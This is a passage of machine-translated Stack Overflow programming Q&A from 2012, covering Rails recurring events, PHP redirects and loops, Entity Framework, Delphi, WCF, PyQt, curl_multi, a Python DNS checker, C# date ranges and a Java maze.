当然，如果您有无限期重复的事件，您将希望限制您希望在未来多长时间内生成这些事件，并使用自动 rake 任务来清理旧事件并生成明年左右的事件。

到目前为止，这种模式对我来说效果很好。

另外，看看[recurring_select](https://github.com/GetJobber/recurring_select) gem，它是一个非常简洁的 ice_cube 表单输入。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-15T02:59:13.400

只是我头脑中的一个观点，也许评论者会指出我目前没有想到的问题：

我会制作一个`RecurringEvent`模型（或任何你想称呼的模型）`has_many :events`。

假设每个事件都是由员工（根据您的笔记）创建的，`RecurringEvent`那么`belong_to :employee`. 然后，您可以建立一种`has_many :through`关系，其中员工有许多事件并且有许多重复事件。

RecurringEvent 模型可以有一个开始日期和一个模式，它最初可以使用这个模式来创建各个发生的事件。然后，对于属于重复系列的任何事件，您可以修改或删除该单个事件，但您也可以“重新生成系列”，删除系列中的所有事件（或系列中的所有未来事件）并重建它们基于一种新的模式，例如将会议从“每个星期二”更改为“每个星期四”。

关于此的另一种好处是您可以创建一个重复事件的一览表，这可能会让您对人们的主要义务有一些很好的了解。

就像我说的那样，我想这就是我的方法，但这只是一个想法，我还没有建立任何类似的东西，所以我不知道我的方法是否有什么大*问题*建议。

祝你好运，请发布你最终做了什么！

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-05-16T23:07:57.300

我对 Rails 很陌生，您的解决方案听起来很有趣。要创建计划和相关事件，您是否在事件模型中使用条件回调？

就我而言，用户将能够创建事件，无论是否每周重复。所以我在考虑事件模型中的一个循环布尔字段。所以我想你会有一个第一个回调来创建时间表：

```
before_save :create_weekly_schedule, if: :recurring 
```

基本上是第二个来创建事件：

```
after_save :create_occurences_if_recurring

def create_occurences_if_recurring
  schedules.each do |sched|
    occurences.create(start_date: sched.start_time, end_date: sched.end_time)
  end
end 
```

这听起来与您的解决方案合乎逻辑吗？谢谢

# php - 未出现必填字段错误

> ID：10148961
> 
> 赞同：0
> 
> 时间：2012-04-13T22:11:38.420
> 
> 标签：php

当使用此代码尝试显示错误时，页面将重定向到 myaccount，但仅在必填字段已完成时才应重定向到那里，例如；

如果没有选择birth_country，则会出现错误消息

```
if(empty($birth_country))
    {
        $err[] = "ERROR - Enter Birth Country";
           header("Location: personal.php?msg=$err[0]");
    } 
```

但如果它被选中，应该重定向到...

```
header("location: myaccount.php?id=" . $_SESSION['user_id']. "");
exit(); 
```

但是无论如何，它总是会转到我的帐户谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:12:55.287

在你的第一个标题之后`exit`。您的代码只是继续，它可能还会发出第二个位置标头，否定第一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T23:22:41.960

就像 Frits 说的，如果你想让它被看到，你必须将错误打印到屏幕上；但是，您不能在 a 之前打印出任何 HTML，`header`否则`header`将不起作用。如果您想在重定向页面上打印错误，那么我建议将错误消息放入`$_SESSION`cookie 中，然后`echo`在重定向页面上调用该 cookie/变量。但是通过这样做，您需要`php session_start()`在问题页面的顶部和重定向页面的顶部使用才能使用`$_SESSION`变量

还有，你的第二`header`

```
header("location: myaccount.php?id=" . $_SESSION['user_id']. "");
exit(); 
```

应该是这样的：

```
header("Location: myaccount.php?id=$_SESSION['user_id']") 
```

通过使用双引号，您不需要添加标签，然后在末尾`$_SESSION[]`添加空白。`""`

# c# - Entity Framework 4.3，使用连接

> ID：10148963
> 
> 赞同：1
> 
> 时间：2012-04-13T22:12:19.170
> 
> 标签：c#, entity-framework-4.3

我在使用我的服务层加入 EF 时遇到了一些问题。每当我尝试加入时，都会出现以下错误：

"**指定的 LINQ 表达式包含对与不同上下文关联的查询的引用**"

我花了无数个小时试图弄清楚这一点。我看到的大多数文章都涉及从不同的上下文中加入实体集。然而，这发生在我使用相同的数据库。我究竟做错了什么？

示例代码：

```
 public virtual IList<ProductVariantAttribute> GetProductVariantAttributes(int ProductID)
     {
         var query = from pva in _productVariantAttributeRepository.Table
                     join b in _productAttributeRepository.Table on pva.ProductAttributeID equals b.ProductAttributeID
                     where pva.ProductID == ProductID
                     select pva;

         var productVariantAttributes = query.ToList();
        return productVariantAttributes;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:33:11.657

这与数据库无关。它与**ObjectContext 的实例有关**。

您在查询中引用了两个不同的存储库。我猜他们每个人都在包装一个EntityContext。这将导致此消息。

这也是一种反模式。我建议您为每个 HTTP 请求或每个 WCF 调用或任何您的工作单元打开一个 EntityContext。

# delphi - 向 TidTCPClients 列表发送命令

> ID：10148964
> 
> 赞同：0
> 
> 时间：2012-04-13T22:12:23.667
> 
> 标签：delphi, indy, indy10

我的代码创建了几个 TidTCPClients，然后在 TThreadList 中添加对它们的引用。

我希望通过然后使用向所有人发送命令

```
for I := 0 to (NumClients - 1) do
begin
  ClientList[I].IOHandler.WriteLn('Whatever');
end; 
```

（这显然只是代码的一小部分）。

但是我收到两个错误：
[DCC 错误] Client.pas(261): E2149 Class does not have a default property
[DCC Error] Client.pas(262): E2233 Property 'IOHandler' inaccessible here

在简要阅读后，我对如何做到[这](http://docs.embarcadero.com/products/rad_studio/delphiAndcpp2009/HelpUpdate2/EN/html/devcommon/cm_need_default_property_xml.html)一点并不明智，但肯定开始认为我完全走错了路。

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T22:46:41.557

参见[文档](http://docwiki.embarcadero.com/VCL/en/Classes.TThreadList)如何操作`TThreadList`。您还需要对`TidTCPClient`列表中的对象进行类型转换，因为它只包含无类型的指针。

```
var
  list: TList;
...
list := ClientList.LockList;
try
  for I := 0 to list.Count - 1 do
  begin
    TidTCPClient(list[I]).IOHandler.WriteLn('Whatever');
  end;
finally
  ClientList.UnlockList;
end; 
```

# asp.net-mvc-3 - 如何缓存 asp.net mvc3 移动应用程序的用户凭据

> ID：10148966
> 
> 赞同：0
> 
> 时间：2012-04-13T22:12:35.870
> 
> 标签：asp.net-mvc-3

我使用 asp.net mvc3,html5,jquerymobile 开发了一个移动应用程序。我正在使用 ADFS 身份验证对用户进行身份验证。一旦用户通过身份验证，他就可以使用 IPAD 或 iPhone 执行下载功能以下载应用程序。现在，一旦下载功能完成，当用户再次尝试导航回应用程序时，他会再次提示登录窗口。

我需要阻止用户再次输入登录凭据。所以我想缓存用户凭据是个好主意。

谁能帮我知道在这种情况下我们如何缓存用户凭据详细信息，以防止用户再次输入登录凭据。

谢谢和问候， 桑托什·库马尔·帕特罗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:16:06.360

您可以使用持久性 cookie。在进行身份验证时，只需将 true 作为第二个参数传递给该[`FormsAuthentication.SetAuthCookie`](http://msdn.microsoft.com/en-us/library/twk5762b.aspx)方法。这将发出一个 cookie，该 cookie 将在您在`<forms>`web.config 中指定的给定超时期限内存储在客户端上。

# c# - WCF 客户端可以在没有触发事件的情况下出现故障吗？

> ID：10148967
> 
> 赞同：1
> 
> 时间：2012-04-13T22:12:40.133
> 
> 标签：c#, wcf

如[其他地方](https://stackoverflow.com/questions/573872/what-is-the-best-workaround-for-the-wcf-client-using-block-issue)所述，此代码可能会出现竞争条件：

```
 // do stuff with client, catch exceptions
    if (client.State == CommunicationState.Faulted)
    {
        client.Abort();
    }
    else
    {
        // I hope nothing happened since I checked for a faulted state
        client.Close();
    } 
```

……或者是吗？

作为状态机，在什么情况下客户端会在尝试检查其状态并随后关闭它之间进入故障状态？即使在几分钟/几小时/几天之后。

我尝试了以下简单的测试，以排除丢失与服务器的连接：

*   在 if 语句处设置一个断点。我看到 client.State == 打开了。踩上去。
*   终止 WCF 服务器进程。踩上去。
*   Client.Close() 执行没有问题。

作为第二个测试，我没有杀死服务器进程，而是等待`ReceiveTimeout`过去。然后我又等了一分钟。然后我踩到 Client.Close()。没问题。

如果没有我的任何输入，客户端是否可以进入故障状态，如果不能，是否真的有可能出现竞争条件？

* * *

编辑：也许这太笼统了，但我正在寻找一般指导。我问这个问题的原因是因为我需要让一些 Web 开发人员使用 WCF 而不是过时的 Web 服务技术。理想情况下，我希望*能够*告诉他们他们不能使用`using`，但`try-catch-finally`只要最终检查错误状态并中止而不是关闭，他们就可以使用（我认为这种方法很容易理解和采用 - 很重要，鉴于当你开始 WCF 时，已经有很多东西要学了）。

然后我开始考虑竞争条件问题并且想不出一个可能发生的例子，因为目的是*关闭*客户端，如果它在其他地方使用你不会这样做（即在程序之间共享或当前程序中的线程。）

所以，问题仍然存在，在这种情况下是否存在竞争条件，任何人都可以向我展示一些演示它的代码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:35:24.950

您链接的帖子正在讨论针对 wxf 代理客户端的 using 语句问题的相当通用的解决方案。因此，在一般情况下，我可以想象在很多情况下您粘贴的代码会发生竞争。尤其是共享同一个客户端的多线程情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-11T17:26:51.563

没有令人满意的答案，所以[MSDN 解决方案](http://msdn.microsoft.com/en-us/library/aa355056.aspx)将不得不这样做：

```
try
{
    ...
    client.Close();
}
catch (CommunicationException e)
{
    ...
    client.Abort();
}
catch (TimeoutException e)
{
    ...
    client.Abort();
}
catch (Exception e)
{
    ...
    client.Abort();
    throw;
} 
```

# cocoa - NSOutlineView 通过绑定进行分组

> ID：10148968
> 
> 赞同：1
> 
> 时间：2012-04-13T22:12:44.347
> 
> 标签：cocoa, binding, cocoa-bindings, nsoutlineview, nstreecontroller

这是一个最佳实践问题，因为我可以想到一些可行的方法。

我想实现一个大纲视图。假设我想在 OmniFocus 中实现一个（我的目标非常相似）：

![在此处输入图像描述](../Images/d4340beb8f6e678d5ccc5b288e14283b.png)

（我指的是该屏幕截图主窗格中的大纲视图，而不是侧边栏。）

所以我的数据类型是一个*任务*。任何任务都可以有子任务。每个任务都有一个或零个父任务。用于在大纲视图中显示的经典数据模型，对吧？

但！我想为用户提供通过他们选择的属性直观地对这些任务进行分组的能力。他们可以按*里程碑*、*分配的用户*或*组件*对它们进行分组……会有很多这样的。并且这个分组应该出现在大纲视图中，在层次结构的顶层，就像这个 OmniFocus 屏幕截图中的“收件箱”、“家庭”和“工作”项目一样。

所以很明显，要显示分组，我应该使用内置的 NSOutlineView 方法来绘制组单元：`outlineView:isGroupItem:`委托方法。问题是，此设置假设大纲视图中的每个项目都由我连接到的任何数据模型中的项目表示：因此我的任务*和*我的组标题都必须在数据模型中表示。

因此，只绑定到代表我的任务的核心数据表是不行的。我可以完全放弃绑定，而只是回到旧式数据源方法，但是我失去了一堆有用的东西。那么有中间立场吗？

例如，我可以创建另一个类`TaskTemporaryGroup`。我给该类一个 ivar NSSet ，即`subtasks`与可用于获取其子项的任务的键路径相同。然后我可以将我的一组 TaskTemporaryGroup 对象绑定到一个树控制器，它会安排整个树，而不管顶层项目与较低级别的项目是不同的类。在实现拖放时，我必须小心，以确保不能随意拖动分组行，但它可能会起作用。

另一个争论点是我想点击表格标题来对每个组中的行进行排序，而不是对顶级组进行排序。我假设 NSTreeController 将排序描述符应用于层次结构的每个级别？对于我希望能够对其余单元格进行排序的任何关键路径，我可以让我的 TaskTemporaryGroup 类返回相同的东西（即，它所需的排序顺序，我已经单独计算），以便框架无论按什么属性对它们进行排序，它们看起来都保持相同的顺序。这是一个好方法还是一个黑客？

所以，总结一下：

*   人们如何建议我实现这种层次结构，其中顶层是一个特例，所有后续级别都是同一种对象？
*   我描述的方式，用一个类来表示碰巧响应与子对象相同的关键路径的顶级对象，是一个好方法吗？
*   有没有人有关于如何在这种情况下使排序正常工作的任何提示？
*   或者尝试使用绑定来完成这项任务会给我带来伤害吗？

谢谢，

艾米

# php - while($array = mysql_fetch_array($queryresults) && $i <= '9' ){ echo "stuff" }

> ID：10148971
> 
> 赞同：2
> 
> 时间：2012-04-13T22:12:52.443
> 
> 标签：php

所以我有一个查询，虽然我的查询可能返回 20 个结果，但我只希望它显示前 9 个结果。有一个愚蠢的原因，我不只是将查询结果限制为 9，为此我需要知道如果 $i 达到 9 时如何停止 while 函数。

代码是

```
 $i = 0;
    while($array = mysql_fetch_array($queryresults) && $i <= '9')
    {
               echo $array['id'];
               $i++;
    } 
```

如何让它在第 9 个结果后停止发出更多回声？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T22:14:17.003

将限制条件放在首位也将确保您只获取 9 行，而不是 10 行和一个丢弃，因为这`&&`被称为*惰性*（如果第一部分为假，它甚至不会查看下一部分）。

```
$i = 0;
while($i < 9 && $array = mysql_fetch_array($queryresults)){
    echo $array['id'];
    $i += 1;
} 
```

或者如果你想变得花哨：

```
$i = 9;
while($i-- > 0 && $array = mysql_fetch_array($queryresults)){
    echo $array['id'];
} 
```

但我发现这个错误很容易..

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T22:17:24.270

```
$i = 0;
while($array = mysql_fetch_array($queryresults) && $i++ < 9)
    echo $array['id'];
} 
```

笔记：

1.  无需加`9`引号
2.  您可以通过`$i++`在`while`循环条件中进行比较后递增（尽管您不必这样做，您也可以将其`echo $array['id']`放在 while 循环主体之后）。
3.  小心！您想要`< 9`而不是`<= 9`从零开始，否则您将获得 10 次循环迭代。

干杯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:14:24.707

您`$i++` 需要在 while 循环内

你也应该有`$i <= 9`而不是，`$i <= '9'`但它仍然应该按原样工作

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T22:16:13.923

'9' 必须是 9

```
$i = 0;
while($array = mysql_fetch_array($queryresults) && $i < 9){
    echo $array['id'];
    $i += 1;
} 
```

# c# - ADO.NET 正确插入数据

> ID：10148973
> 
> 赞同：4
> 
> 时间：2012-04-13T22:12:59.057
> 
> 标签：c#, insert, ado.net, sql-server-ce

我在我的 C# 项目中使用 SQL CE 3.5 数据库。

当我向表中添加新数据时，比如说一个简单的行，我觉得我做错了。我正在做的是这样的：

```
const string commandStr = "INSERT INTO tableName (size, x, y) VALUES(@size, @x, @y)";
using (SqlCeCommand command = new SqlCeCommand(commandStr, _connection))
{
    command.Parameters.AddWithValue("@size", size);
    command.Parameters.AddWithValue("@x", x);
    command.Parameters.AddWithValue("@y", y);
    int affectedRows = command.ExecuteNonQuery();
} 
```

当然，我在项目中使用的实际表格有更多的列。显然，这是很多打字。这让我想到了一个点：“我是一个 .NET 开发者。一定有一些感觉更自然的东西。”

所以我的问题是：有没有更好的方法来做到这一点？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:18:44.833

有时在某些极端情况下需要按照自己的方式进行操作。但是，要获得完整、冗长、“.NET 开发人员”的感觉，请尝试使用 Entity Framework。太棒了。

[在我看来， Entity Framework](http://msdn.microsoft.com/en-us/data/aa937723)非常适合这个。我真的很喜欢使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:18:28.840

是的。它被称为 Linq :) [http://msdn.microsoft.com/en-us/library/bb308959.aspx](http://msdn.microsoft.com/en-us/library/bb308959.aspx)

Linq 2 SQL 或 Linq 2 实体，取决于您的具体需求。我发现它比使用原始 ado.net 更自然，而且我敢打赌您不会感到任何真正的性能问题。

# python - 如何在 pyQT 中自定义对话框信号/插槽？

> ID：10148974
> 
> 赞同：0
> 
> 时间：2012-04-13T22:13:08.187
> 
> 标签：python, pyqt, pyqt4

我有一组按钮，确定和取消

```
buttonBox = QtGui.QDialogButtonBox(QtGui.QDialogButtonBox.Ok|
                                    QtGui.QDialogButtonBox.Cancel) 
```

当我们点击时，我想要一个对话提示`Cancel`

```
self.connect(buttonBox, SIGNAL("rejected()"),
                            self, SLOT("reject()"))
    def reject(self):
        print 'hello'
        self.emit(SIGNAL("reject()")) 
```

我不确定要发射什么。我不想只是关闭这个东西。`QMessageBox`当我按下 时，我知道如何创建一个`X`。我想做提示并关闭`reject`。

我希望这是有道理的。谢谢。

* * *

供您参考，当我按下`X`关闭整个应用程序时，我有一个覆盖的方法

```
def closeEvent(self, event):
    reply = QtGui.QMessageBox.question(self, 'Message', 'Are you sure to quit?', QtGui.QMessageBox.Yes | QtGui.QMessageBox.No, QtGui.QMessageBox.No)
    if reply == QtGui.QMessageBox.Yes:
        event.accept()
    else:
        event.ignore() 
```

这种覆盖`self.close()`方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:02:39.347

你不会发出任何东西。`QDialog`有一个[`reject()`](http://qt-project.org/doc/qt-5.0/qdialog.html#reject)设置返回码`Rejected`并关闭对话框的槽。你需要这样称呼。您`reject`还命名了自定义插槽，从而覆盖了它。你仍然可以这样称呼它：

```
super(NameOfClass, self).reject() 
```

或将您的插槽名称更改为其他名称并使用：

```
self.reject() 
```

在那里。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-05T12:16:02.320

您可能想要覆盖 QDialog 类的 accept() 函数。

例如：

```
def accept(self):
    if your_validation_userconfirmation_fct():
        self.done(QtWidgets.QDialog.Accepted) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-02-17T17:38:24.257

让我们覆盖accept() 函数。

```
def accept(self):
    if validation_ok():
        super().accept() 
```

# objective-c - 标签栏仍然突出显示

> ID：10148978
> 
> 赞同：0
> 
> 时间：2012-04-13T22:13:24.823
> 
> 标签：objective-c, xcode, ios5

当您点击一个项目时，我有一个带有标签栏的应用程序，您将被发送到另一个视图控制器。但是当我回来时，所选项目仍然突出显示。

有谁知道如何取消选择这个？

对于 Tablecell，您可以这样做；

```
 [tableView deselectRowAtIndexPath:[tableView indexPathForSelectedRow] animated:NO]; 
```

但是 TabBar 项呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T02:38:30.430

如果 UITabBar 没有 UITabBarController，则可以使用`[tabs setSelectedItem:nil];`. 如果有控制器，`[controller setSelectedViewController:nil];`应取消选择该选项卡。

# php - 为什么 curl_multi_select 和 curl_multi_info_read 相互矛盾？

> ID：10148979
> 
> 赞同：4
> 
> 时间：2012-04-13T22:13:25.620
> 
> 标签：php, curl, curl-multi

当我运行下面的代码时，在我看来`curl_multi_select`并且`curl_multi_info_read`彼此矛盾。据我了解，它`curl_multi_select`应该是阻塞的，直到`curl_multi_exec`有响应，但我还没有看到实际发生。

```
$url = "http://google.com";
$ch  = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_VERBOSE, TRUE);

$mc = curl_multi_init();
curl_multi_add_handle($mc, $ch);

do {
  $exec = curl_multi_exec($mc, $running);
} while ($exec == CURLM_CALL_MULTI_PERFORM);

$ready=curl_multi_select($mc, 100);
var_dump($ready);

$info = curl_multi_info_read($mc,$msgs);
var_dump($info); 
```

这返回

```
int 1
boolean false 
```

这似乎自相矛盾。它怎么能准备好并且没有任何消息？

我使用的 php 版本是 5.3.9

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-05T18:27:06.290

Basically `curl_multi_select` blocks until there is something to read or send with `curl_multi_exec`. If you loop around `curl_multi_exec` without using `curl_multi_select` this will eat up 100% of a CPU core. So `curl_multi_info_read` is used to check if any transfer has ended (correctly or with an error).

Code using the multi handle should follow the following pattern:

```
do
{
    $mrc = curl_multi_exec($this->mh, $active);
}
while ($mrc == CURLM_CALL_MULTI_PERFORM);

while ($active && $mrc == CURLM_OK)
{
    curl_multi_select($this->mh);
    do
    {
        $mrc = curl_multi_exec($this->mh, $active);
    }
    while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($info = curl_multi_info_read($this->mh))
    {
        $this->process_ch($info);
    }
} 
```

See also: [Doing curl_multi_exec the right way](http://www.adrianworlddesign.com/Knowledge-Base/php/Download-content-with-cURL/Doing-curlmultiexec-the-right-way).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:26:57.557

从[规格](http://us3.php.net/manual/en/function.curl-multi-info-read.php)：

*询问多手柄是否有来自个人传输的任何消息或信息。消息可能包含诸如来自传输的错误代码之类的信息，或者只是传输完成的事实。*

1 可能意味着有活动，但不一定有消息等待：在这种情况下，可能您的一些下载数据可用，但不是全部。[curl_multi_select](http://us3.php.net/manual/en/function.curl-multi-select.php)文档中的示例显式测试从`curl_multi_info_read`.

# python - Python：DNS 查询：Pydns？挖？插座？

> ID：10148981
> 
> 赞同：-1
> 
> 时间：2012-04-13T22:13:33.150
> 
> 标签：python, command-line, dns

我正在尝试编写一个 python 脚本，它将接收一系列主机名的命令行参数并执行 dns 查询。如果查询成功，则不会发生任何事情，否则将抛出异常。这是我到目前为止所拥有的：

```
#!/usr/bin/env python

   import socket
   import sys, os
   import DNS

   if len(sys.argv) <=3:
      print >>sys.stderr, 'usage:DnsCheck <hostname> <hostname> <hostname>'
      sys.exit(2)
   args = str(sys.argv[1:])
   command = "dig " + args

   def main(args):
      try:
         for i in args:
         #socket.gethostbyname(i)
         os.popen(command)
   except socket.error, e:
      print e

   if __name__ == '__main__':
      main(args) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:58:05.890

```
import socket
import sys

def main():
    if len(sys.argv) < 2:
        print("Usage: dnscheck hostname [hostname...]")
    else:
        for host in sys.argv[1:]:
            try:
                ip = socket.gethostbyname(host)
                print("{} resolves to {}".format(host, ip))
            except socket.gaierror:
                print("Could not resolve {}".format(host))

if __name__=="__main__":
    main() 
```

# c# - 将一个时间段拆分为多个时间段

> ID：10148986
> 
> 赞同：5
> 
> 时间：2012-04-13T22:14:03.390
> 
> 标签：c#

如果我有一个时间段，可以说`DateFrom`并且`DateTo`我有一个日期列表，这些日期将是拆分日期。例如：

```
DateTime dateFrom = new DateTime(2012, 1, 1);
DateTime dateTo = new DateTime(2012, 12, 31);

List<DateTime> splitDates = new List<DateTime>
    {
        new DateTime(2012,2,1),
        new DateTime(2012,5,1),
        new DateTime(2012,7,1),
        new DateTime(2012,11,1),
    };

List<Tuple<DateTime, DateTime>> periods = SplitDatePeriod(dateFrom, dateTo, splitDates); 
```

我希望结果是一个句点列表，因此对于前面的示例，结果应该是：

```
(01/01/2012 - 01/02/2012)
(02/02/2012 - 01/05/2012)
(02/05/2012 - 01/07/2012)
(02/07/2012 - 01/11/2012)
(02/11/2012 - 31/12/2012) 
```

我已经写了一个方法来做到这一点：

```
List<Tuple<DateTime, DateTime>> SplitDatePeriod(DateTime dateFrom, DateTime dateTo, List<DateTime> splitDates)
{
    var resultDates = new List<Tuple<DateTime, DateTime>>();

    // sort split dates
    List<DateTime> _splitDates = splitDates.OrderBy(d => d.Date).ToList();

    DateTime _curDate = dateFrom.Date;
    for (int i = 0; i <= _splitDates.Count; ++i)
    {
        DateTime d = (i < _splitDates.Count) ? _splitDates[i] : dateTo;

        // skip dates out of range
        if (d.Date < dateFrom.Date || d.Date > dateTo.Date)
            continue;

        resultDates.Add(Tuple.Create(_curDate, d));

        _curDate = d.AddDays(1);
    }
    return resultDates;
} 
```

**问题**
看起来很丑陋，有没有更简洁和更短的方法？也许使用 Linq？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T22:32:57.990

这是一个有效的方法，也可以处理一些边缘情况：

```
var realDates = splitDates
    .Where(d => d > dateFrom && d < dateTo)
    .Concat(new List<DateTime>() {dateFrom.AddDays(-1), dateTo})
    .Select(d => d.Date)
    .Distinct()
    .OrderBy(d => d)
    .ToList();

// now we have             (start - 1) -- split1 -- split2 -- split3 -- end
// we zip it against          split1   -- split2 -- split3 --  end
// and produce       start,split1 -- split1+1,split2 -- split2+1,split3 -- split3+1,end

realDates.Zip(realDates.Skip(1), (a, b) => Tuple.Create(a.AddDays(1), b)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:35:14.030

你可以这样做：

```
List<DateTime> split =
  splitDates.Where(d => d >= dateFrom && d <= dateTo).ToList();

List<Tuple<DateTime, DateTime>> periods =
  Enumerable.Range(0, split.Count + 1)
  .Select(i => new Tuple<DateTime, DateTime>(
    i == 0 ? dateFrom : split[i - 1].AddDays(1),
    i == split.Count ? dateTo : split[i]
  ))
  .ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:36:48.803

如果您将所有日期放入一个列表中，那么这应该有效：

```
var dates = new List<DateTime>
        {
            new DateTime(2012, 1, 1),
            new DateTime(2012, 2, 1),
            new DateTime(2012, 5, 1),
            new DateTime(2012, 7, 1),
            new DateTime(2012, 11, 1),
            new DateTime(2012, 12, 31)
        };

var z = dates.Zip(dates.Skip(1), (f, s) => Tuple.Create(f.Equals(dates[0]) ? f : f.AddDays(1), s)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T22:28:34.857

虽然 LB 是正确的，而且这可能属于 Code Review，但我想尝试一下：

给定您的第一个代码块，以下代码将满足您的要求：

```
// List of all dates in order that are valid
var dateSegments = new [] { dateFrom, dateTo }
    .Concat(splitDates.Where(x => x > dateFrom && x < dateTo))
    .OrderBy(x => x)
    .ToArray();

List<Tuple<DateTime, DateTime>> results = new List<Tuple<DateTime, DateTime>>();
for(var i = 0; i < dateSegments.Length - 1; i++)
{
    results.Add(new Tuple<DateTime, DateTime>(dateSegments[i], dateSegments[i+1]));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-14T00:25:46.797

```
List<DateTime> splitDates = GetSplitDates();
DateTime dateFrom = GetDateFrom();
DateTime dateTo = GetDateTo();

List<DateTime> edges = splitDates
  .Where(d => dateFrom < d && d < dateTo)
  .Concat(new List<DateTime>() {dateFrom, dateTo})
  .Distinct()
  .OrderBy(d => d)
  .ToList();

//must be at least one edge since we added at least one unique date to this.
DateTime currentEdge = edges.First();

List<Tuple<DateTime, DateTime>> resultItems = new List<Tuple<DateTime, DateTime>>();

foreach(DateTime nextEdge in edges.Skip(1))
{
  resultItems.Add(Tuple.Create(currentEdge, nextEdge));
  currentEdge = nextEdge;
}

return resultItems; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-04-25T10:03:46.423

我使获取提供的 DateRange 之间的日期变得简单。

模型对象

```
 public class DateObjectClass
{
    public DateTime startDate { get; set; }
    public DateTime endDate { get; set; }
} 
```

行动 ：

```
 public List<DateObjectClass> SplitDateRangeByDates(DateTime start,DateTime end)
    {
        List<DateObjectClass> datesCollection = new List<DateObjectClass>();
        DateTime startOfThisPeriod = start;
        while (startOfThisPeriod < end)
        {
            DateTime endOfThisPeriod =new DateTime(startOfThisPeriod.Year,startOfThisPeriod.Month,startOfThisPeriod.Day,23,59,59);
            endOfThisPeriod = endOfThisPeriod < end ? endOfThisPeriod : end;
            datesCollection.Add(new DateObjectClass() { startDate= startOfThisPeriod ,endDate  =endOfThisPeriod});
            startOfThisPeriod = endOfThisPeriod;
            startOfThisPeriod = startOfThisPeriod.AddSeconds(1);
        }

        return datesCollection;
    } 
```

# java - 枚举类型 2Darray 迷宫

> ID：10148988
> 
> 赞同：0
> 
> 时间：2012-04-13T22:14:09.183
> 
> 标签：java, enums, multidimensional-array, maze

我正在制作一个带有枚举类型的迷宫游戏来保存墙壁、开放空间（等）的值，但我不确定为什么这段代码不起作用，我正在尝试创建一个新板并将所有内容设置为打开，然后通过并随机为数组中的点设置值。

```
maze = new Cell[row][col];
for (int r = 0; r < maze.length; r++) {
    for (int c = 0; c < maze.length; c++) 
        maze[r][c].setType(CellType.OPEN);
    }

Random randomMaze = new Random();
for (int ran = 0; ran <= numWalls ; ran++){
    maze[randomMaze.nextInt(maze.length)][randomMaze.nextInt(maze.length)].setType(CellType.WALL); 

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:20:37.010

我认为，您的内部循环应该类似于

```
for (int c = 0; c < maze[r].length; c++) 
```

... 与`[r]`.

*我还没有尝试过。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:44:23.413

我认为你的迷宫是一个很好的班级候选人。像这样的东西应该工作：

```
import java.util.Random;

public class Maze {
    private int[][] mMaze;
    private int mRows;
    private int mCols;

    //enums here:
    public static int CELL_TYPE_OPEN = 0;
    public static int CELL_TYPE_WALL = 1;

    public Maze(int rows, int cols){
        mRows = rows;
        mCols = cols;
        mMaze = new int[mRows][mCols];
        for (int r = 0; r < mRows; r++) {
            for (int c = 0; c < mCols; c++) { 
                mMaze[r][c] = Maze.CELL_TYPE_OPEN;
            }
        }
    }

    public void RandomizeMaze(int numWalls){
        Random randomMaze = new Random();
        for (int ran = 0; ran <= numWalls ; ran++){
            mMaze[randomMaze.nextInt(mRows)][randomMaze.nextInt(mCols)]=(Maze.CELL_TYPE_WALL);
        }
    } 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T04:00:46.803

这会做你说的。不确定你会得到你想要的那种迷宫：

```
import java.util.Random;
class Maze {
    enum CellType {
        open,wall;
    }
    Maze(int n) {
        this.n=n;
        maze=new CellType[n][n];
        init();
    }
    private void init() {
        for(int i=0;i<n;i++)
            for(int j=0;j<n;j++)
                maze[i][j]=CellType.open;
    }
    void randomize(int walls) {
        init();
        Random random=new Random();
        for(int i=0;i<=walls;i++)
            maze[random.nextInt(n)][random.nextInt(n)]=CellType.wall;
    }
    public String toString() {
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<n;i++) {
            for(int j=0;j<n;j++)
                switch(maze[i][j]) {
                    case open:
                        sb.append(' ');
                        break;
                    case wall:
                        sb.append('|');
                        break;
                }
            sb.append('\n');
        }
        return sb.toString();
    }
    final int n;
    CellType[][] maze;
}
public class Main {
    public static void main(String[] args) {
        Maze maze=new Maze(5);
        System.out.println(maze);
        maze.randomize(4);
        System.out.println(maze);
    }
} 
```

# tridion - SDL Tridion 中的相对路径处理

> ID：10148991
> 
> 赞同：3
> 
